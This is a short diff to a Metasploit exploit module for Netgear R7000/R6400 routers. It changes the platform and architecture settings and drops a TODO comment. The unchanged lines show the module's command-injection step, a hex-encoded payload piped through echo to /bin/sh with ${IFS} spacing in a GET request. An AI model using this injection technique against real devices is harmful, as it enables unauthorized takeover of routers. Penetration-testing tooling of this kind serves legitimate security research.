@@ -18,11 +18,11 @@ class MetasploitModule < Msf::Exploit::Remote
         Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.
       },
       'License'              => MSF_LICENSE,
-      'Platform'             => 'unix',
+      'Platform'             => 'linux',
       'Author'               => ['thecarterb', 'Acew0rm'],
       'DefaultTarget'        => 0,
       'Privileged'           => false,
-      'Arch'                 => [ARCH_CMD],
+      'Arch'                 => [ARCH_X86, ARCH_X64],
       'Targets'              => [
         [ 'Automatic Target', { } ]
       ],
@@ -79,7 +79,6 @@ class MetasploitModule < Msf::Exploit::Remote
       return
     end
     cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}.join
-    # TODO: force use of echo-ne CMD encoder
     str = "echo${IFS}-ne${IFS}\"#{cmd}\"|/bin/sh&"
 
     print_status("Sending GET request with encoded command line...")
